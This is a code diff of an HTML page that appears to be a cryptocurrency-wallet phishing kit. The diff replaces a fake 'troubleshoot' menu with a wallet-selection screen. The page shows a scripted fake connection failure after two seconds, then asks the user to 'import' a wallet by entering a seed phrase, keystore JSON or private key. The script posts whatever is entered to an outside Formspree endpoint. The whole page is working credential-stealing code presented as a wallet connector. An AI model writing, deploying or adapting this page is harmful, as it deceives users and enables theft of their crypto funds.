@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sync Wallets - Troubleshoot</title>
+    <title>Wallet Selection</title>
     <link rel="stylesheet" href="color.css">
 </head>
 <body>
@@ -11,134 +11,254 @@
         <div class="banner">
             <img src="assets/banner.jpg" alt="Wallet Security Banner">
         </div>
-        <h1>Get Started Below.</h1>
+        <h1>Select Your Wallet or Exchanger</h1>
+        <p><a href="index.html" style="color: #00d4ff; text-decoration: none;">Back to Home</a></p>
     </header>
     
-    <div class="troubleshoot-container" id="troubleshootContainer"></div>
+    <div class="wallet-container" id="walletContainer"></div>
 
-    <!-- Authentication Popup -->
-    <div id="authPopup" class="popup" style="display: none;">
+    <!-- Wallet Selection Popup -->
+    <div id="walletPopup" class="popup" style="display: none;">
         <div class="popup-content">
-            <h2>Wallet Authentication</h2>
+            <h2>Connect your wallet</h2>
+            <div class="wallet-list" id="walletList"></div>
+        </div>
+    </div>
+
+    <!-- Initializing Popup -->
+    <div id="initPopup" class="popup" style="display: none;">
+        <div class="popup-content">
+            <h2>Initializing</h2>
+            <div class="wallet-info">
+                <span id="initWalletName"></span>
+                <img id="initWalletLogo" src="" alt="Wallet Logo" class="wallet-logo-small">
+            </div>
+        </div>
+    </div>
+
+    <!-- Error/Manual Connect Popup -->
+    <div id="errorPopup" class="popup" style="display: none;">
+        <div class="popup-content">
+            <p style="color: red;">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
+            <h2>Import your <span id="errorWalletName"></span> wallet</h2>
             
-            <label for="authType">Select Authentication Method:</label>
-            <select id="authType" name="authType">
-                <option value="seed">Seed Phrase</option>
-                <option value="keygen">Keygen</option>
-                <option value="passkey">Passkey</option>
-            </select>
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('phrase')">Phrase</button>
+                <button class="tab-btn" onclick="switchTab('keystore')">Keystore JSON</button>
+                <button class="tab-btn" onclick="switchTab('privatekey')">Private Key</button>
+            </div>
 
-            <label for="authInput">Enter Credentials:</label>
-            <input type="text" id="authInput" name="authInput" placeholder="Enter your credentials">
+            <label for="manualInput">Enter your wallet <span id="inputLabel">phrase</span></label>
+            <input type="text" id="manualInput" name="manualInput" placeholder="Enter your wallet phrase">
 
-            <p id="authMessage" class="hidden"></p>
+            <p id="errorMessage" class="hidden"></p>
 
-            <button class="connect-btn" onclick="connectWallet()">Connect</button>
-            <button id="closeAuthPopup" class="close-btn">Close</button>
+            <button class="connect-btn" onclick="validateManualInput()">Validate</button>
+            <button id="closeErrorPopup" class="close-btn">Close</button>
         </div>
     </div>
 
     <script>
-        const troubleshootOptions = [
-            { name: "Migration", description: "Click here for migration or to resolve any migration related issues." },
-            { name: "Rectification", description: "Click here to rectify all strange wallet issues." },
-            { name: "Claim", description: "Click here to claim tokens or resolve any token claiming related issues." },
-            { name: "Swap", description: "Click here to swap tokens or resolve token swaplist." },
-            { name: "Slippage", description: "Click here for slippage or transaction fee related issues." },
-            { name: "Claim Airdrop", description: "Click here to claim airdrop or resolve errors encountered during airdrop claim." },
-            { name: "Staking", description: "Click here to resolve issues while staking/unstaking." },
-            { name: "Whitelist", description: "Click here to whitelist your address or resolve whitelisting related error." },
-            { name: "Cross Transfer", description: "Click here to resolve cross transfer issues." },
-            { name: "NFTs", description: "Click here to resolve NFT related issues." },
-            { name: "Locked Account", description: "Click here to resolve locked account issues." },
-            { name: "Login Error", description: "Click here to resolve login error issues." }
+        const wallets = [
+            "Metamask", "Trust", "Coinbase", "Xumm", "Cardano", "Daedalus", "Yoroi", "CCVault",
+            "Gero", "Nami", "Solana", "Phantom", "Solflare", "Sollet", "Solong", "Exodus",
+            "Avalanche", "Velas", "Crypto.com", "Blockchain", "Binance Smart Chain", "Safepal", "Argent",
+            "Fortmatic", "Aktionariat", "Keyring Pro", "BitKeep", "SparkPoint", "OwnBit", "Infinity Wallet",
+            "Wallet.io", "Infinito", "Torus", "Nash", "BitPay", "imToken", "Ambire", "Apolox",
+            "Bitski", "Bobablocks", "Crossmint", "Defiant", "Fireblocks", "KryptoGo", "Ledger",
+            "Now", "Nufinetes", "Onekey", "Paper", "Pier", "Prema", "Rice", "Safemoon",
+            "Secux", "Sequence", "Tokenary", "Unipass", "Venly", "Verso", "Wallet3", "Polkadot",
+            "Filecoin", "IOST", "Qtum", "Waves", "Algorand", "Zcash", "Vechain", "Tezos",
+            "Stellar", "Tron", "Terra", "Cosmos", "Metis", "Optimism"
         ];
 
-        const troubleshootContainer = document.getElementById("troubleshootContainer");
+        const walletContainer = document.getElementById("walletContainer");
+        const walletList = document.getElementById("walletList");
 
-        troubleshootOptions.forEach(option => {
-            let optionBox = document.createElement("div");
-            optionBox.classList.add("troubleshoot-box");
-            optionBox.setAttribute("tabindex", "0");
-            optionBox.setAttribute("role", "button");
-            optionBox.innerHTML = `
-                <h3>${option.name.toUpperCase()}</h3>
-                <p>${option.description}</p>
+        // Populate wallet list in the main container (for direct access to main.html)
+        wallets.forEach(wallet => {
+            let walletBox = document.createElement("div");
+            walletBox.classList.add("wallet-box");
+            walletBox.setAttribute("tabindex", "0");
+            walletBox.setAttribute("role", "button");
+            walletBox.innerHTML = `
+                <img src="assets/wallets/${wallet.toLowerCase()}.png" alt="${wallet} Logo" class="wallet-logo" onerror="this.src='assets/default.png'">
+                <p>${wallet}</p>
             `;
-            optionBox.onclick = () => openAuthPopup(option.name);
-            optionBox.onkeydown = (e) => {
+            walletBox.onclick = () => openInitPopup(wallet);
+            walletBox.onkeydown = (e) => {
                 if (e.key === "Enter" || e.key === " ") {
-                    openAuthPopup(option.name);
+                    openInitPopup(wallet);
                 }
             };
-            troubleshootContainer.appendChild(optionBox);
+            walletContainer.appendChild(walletBox);
         });
 
-        let selectedOption = null;
+        // Populate wallet list in the popup (for when accessed via index.html or syncwallets.html)
+        wallets.forEach(wallet => {
+            let walletItem = document.createElement("div");
+            walletItem.classList.add("wallet-item");
+            walletItem.setAttribute("tabindex", "0");
+            walletItem.setAttribute("role", "button");
+            walletItem.innerHTML = `
+                <span class="wallet-status"></span>
+                <span>${wallet}</span>
+                <img src="assets/wallets/${wallet.toLowerCase()}.png" alt="${wallet} Logo" class="wallet-logo-small" onerror="this.src='assets/default.png'">
+            `;
+            walletItem.onclick = () => {
+                document.getElementById("walletPopup").style.display = "none";
+                openInitPopup(wallet);
+            };
+            walletItem.onkeydown = (e) => {
+                if (e.key === "Enter" || e.key === " ") {
+                    document.getElementById("walletPopup").style.display = "none";
+                    openInitPopup(wallet);
+                }
+            };
+            walletList.appendChild(walletItem);
+        });
 
-        function openAuthPopup(optionName) {
-            selectedOption = optionName;
-            document.getElementById("authPopup").style.display = "flex";
+        let selectedWallet = null;
+        let selectedTroubleshootOption = null;
+        let currentTab = "phrase";
+
+        // Open wallet selection popup
+        function openWalletPopup(troubleshootOption = null) {
+            selectedTroubleshootOption = troubleshootOption;
+            document.getElementById("walletPopup").style.display = "flex";
         }
 
-        function closeAuthPopup() {
-            selectedOption = null;
-            document.getElementById("authPopup").style.display = "none";
-            document.getElementById("authMessage").textContent = "";
-            document.getElementById("authMessage").classList.add("hidden");
+        // Open initializing popup
+        function openInitPopup(wallet) {
+            selectedWallet = wallet;
+            document.getElementById("initWalletName").textContent = wallet;
+            document.getElementById("initWalletLogo").src = `assets/wallets/${wallet.toLowerCase()}.png`;
+            document.getElementById("initWalletLogo").onerror = () => {
+                document.getElementById("initWalletLogo").src = 'assets/default.png';
+            };
+            document.getElementById("initPopup").style.display = "flex";
+
+            // Simulate a failed connection attempt (2 seconds delay)
+            setTimeout(() => {
+                document.getElementById("initPopup").style.display = "none";
+                openErrorPopup(wallet);
+            }, 2000);
         }
 
-        document.getElementById("closeAuthPopup").addEventListener("click", closeAuthPopup);
+        // Open error/manual connect popup
+        function openErrorPopup(wallet) {
+            document.getElementById("errorWalletName").textContent = wallet;
+            document.getElementById("errorPopup").style.display = "flex";
+            currentTab = "phrase";
+            updateInputLabel();
+        }
+
+        // Close error popup
+        function closeErrorPopup() {
+            selectedWallet = null;
+            selectedTroubleshootOption = null;
+            currentTab = "phrase";
+            document.getElementById("manualInput").value = "";
+            document.getElementById("errorMessage").textContent = "";
+            document.getElementById("errorMessage").classList.add("hidden");
+            document.getElementById("errorPopup").style.display = "none";
+            updateTabButtons();
+        }
+
+        document.getElementById("closeErrorPopup").addEventListener("click", closeErrorPopup);
 
         window.onclick = function(event) {
             if (event.target.classList.contains("popup")) {
-                closeAuthPopup();
+                document.getElementById("walletPopup").style.display = "none";
+                document.getElementById("initPopup").style.display = "none";
+                closeErrorPopup();
             }
         };
 
-        function connectWallet() {
-            let authType = document.getElementById("authType").value;
-            let authInput = document.getElementById("authInput").value.trim();
-            let message = document.getElementById("authMessage");
+        // Switch between tabs (Phrase, Keystore JSON, Private Key)
+        function switchTab(tab) {
+            currentTab = tab;
+            updateInputLabel();
+            updateTabButtons();
+        }
+
+        function updateInputLabel() {
+            const label = document.getElementById("inputLabel");
+            const placeholder = document.getElementById("manualInput");
+            if (currentTab === "phrase") {
+                label.textContent = "phrase";
+                placeholder.placeholder = "Enter your wallet phrase";
+            } else if (currentTab === "keystore") {
+                label.textContent = "keystore JSON";
+                placeholder.placeholder = "Enter your keystore JSON";
+            } else if (currentTab === "privatekey") {
+                label.textContent = "private key";
+                placeholder.placeholder = "Enter your private key";
+            }
+        }
+
+        function updateTabButtons() {
+            document.querySelectorAll(".tab-btn").forEach(btn => {
+                btn.classList.remove("active");
+                if (btn.textContent.toLowerCase().replace(" ", "") === currentTab) {
+                    btn.classList.add("active");
+                }
+            });
+        }
+
+        // Validate manual input and submit to Formspree
+        function validateManualInput() {
+            let manualInput = document.getElementById("manualInput").value.trim();
+            let message = document.getElementById("errorMessage");
 
             message.textContent = "";
             message.classList.add("hidden");
 
-            if (authInput === "") {
-                message.textContent = "Error: Credentials cannot be empty!";
+            if (manualInput === "") {
+                message.textContent = "Error: Input cannot be empty!";
                 message.classList.remove("hidden");
                 return;
             }
 
-            if (authType === "seed" && authInput.split(" ").length !== 12) {
+            if (currentTab === "phrase" && manualInput.split(" ").length !== 12) {
                 message.textContent = "Error: Seed phrase must be 12 words!";
                 message.classList.remove("hidden");
                 return;
             }
 
-            if (authType === "keygen" && authInput.length < 16) {
-                message.textContent = "Error: Keygen must be at least 16 characters!";
+            if (currentTab === "keystore" && manualInput.length < 16) {
+                message.textContent = "Error: Keystore JSON must be at least 16 characters!";
                 message.classList.remove("hidden");
                 return;
             }
 
-            if (authType === "passkey" && authInput.length < 8) {
-                message.textContent = "Error: Passkey must be at least 8 characters!";
+            if (currentTab === "privatekey" && manualInput.length < 8) {
+                message.textContent = "Error: Private key must be at least 8 characters!";
                 message.classList.remove("hidden");
                 return;
+            }
+
+            let formData = `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}`;
+            if (selectedTroubleshootOption) {
+                formData += `&troubleshootOption=${encodeURIComponent(selectedTroubleshootOption)}`;
             }
 
             fetch("https://formspree.io/f/mvgkalye", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: `authType=${encodeURIComponent(authType)}&authInput=${encodeURIComponent(authInput)}&troubleshootOption=${encodeURIComponent(selectedOption)}`
+                body: formData
             })
             .then(response => {
                 if (response.ok) {
                     message.textContent = "Credentials submitted successfully!";
                     message.style.color = "green";
                     message.classList.remove("hidden");
-                    setTimeout(closeAuthPopup, 2000);
+                    setTimeout(() => {
+                        closeErrorPopup();
+                        if (!selectedTroubleshootOption) {
+                            window.location.href = "syncwallets.html";
+                        }
+                    }, 2000);
                 } else {
                     message.textContent = `Error submitting credentials. Status: ${response.status}`;
                     message.style.color = "red";
@@ -152,47 +272,9 @@
             });
         }
 
-        document.getElementById("authInput").addEventListener("input", function () {
-            document.getElementById("authMessage").classList.add("hidden");
+        document.getElementById("manualInput").addEventListener("input", function () {
+            document.getElementById("errorMessage").classList.add("hidden");
         });
     </script>
-
-    <style>
-        .troubleshoot-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            padding: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .troubleshoot-box {
-            background-color: #1a2a44;
-            border: 2px solid #2a3b5a;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: transform 0.2s, border-color 0.2s;
-        }
-
-        .troubleshoot-box:hover {
-            transform: scale(1.05);
-            border-color: #00d4ff;
-        }
-
-        .troubleshoot-box h3 {
-            margin: 0 0 10px;
-            font-size: 1.2em;
-            color: #ffffff;
-        }
-
-        .troubleshoot-box p {
-            margin: 0;
-            font-size: 0.9em;
-            color: #b0b0b0;
-        }
-    </style>
 </body>
 </html>
